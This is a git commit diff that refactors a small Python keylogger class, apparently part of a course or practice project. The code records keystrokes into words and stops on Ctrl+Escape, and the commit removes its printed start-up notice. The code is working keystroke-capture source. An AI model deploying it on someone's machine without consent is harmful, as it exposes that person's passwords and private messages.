a3bccd64e661995381bca5b544ba084115c99e0e
Ori <odmark2023@gmail.com>
2025-09-02 12:44:45 +0300

    correct the functions names and return typs

--- KeyLoggerService.py
+++ KeyLoggerService.py
@@ -4,18 +4,16 @@ from  interface_key_logger import IKeyLogger  # Your interface
 
 class KeyLogger(IKeyLogger):
     def __init__(self):
-        self.logged_keys: List[str] = []
-        self.current_word: List[str] = []
-        self.words: List[str] = []
+        self.current_word = []
+        self.words = []
         self.ctrl_pressed = False  # Track if Ctrl is pressed
-        self.listener = keyboard.Listener(on_press=self._on_press, on_release=self._on_release)
+        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
 
-    def _on_press(self, key):
+    def on_press(self, key):
         # Detect Ctrl + Escape to stop the keylogger
         if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
             self.ctrl_pressed = True
         elif key == keyboard.Key.esc and self.ctrl_pressed:
-
             self.stop_logging()
 
         # Record keys into words
@@ -25,37 +23,32 @@ class KeyLogger(IKeyLogger):
                 self.current_word.append(char)
         except AttributeError:
             if key == keyboard.Key.space:
-                if self.current_word:
-                    self.words.append(''.join(self.current_word))
-                    self.current_word = []
+                self.get_logged_keys()
             elif key == keyboard.Key.enter:
-                if self.current_word:
-                    self.words.append(''.join(self.current_word))
-                    self.current_word = []
+                self.get_logged_keys()
             elif key == keyboard.Key.backspace:
                 if self.current_word:
                     self.current_word.pop()
 
-    def _on_release(self, key):
+    def on_release(self, key):
         if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
             self.ctrl_pressed = False
 
-    def start_logging(self) -> None:
-        print("Keylogger started. Press Ctrl + Escape to stop.")
+    def start_logging(self):
+        # Keylogger started. Press Ctrl + Escape to stop
         self.listener.start()
         self.listener.join()
 
-    def stop_logging(self) -> None:
+    def stop_logging(self):
         self.listener.stop()
 
-    def get_logged_keys(self) -> List[str]:
+    def get_logged_keys(self):
         if self.current_word:
             self.words.append(''.join(self.current_word))
             self.current_word = []
         return self.words
 
 
-# --- Example usage ---
 if __name__ == "__main__":
     logger = KeyLogger()
     logger.start_logging()
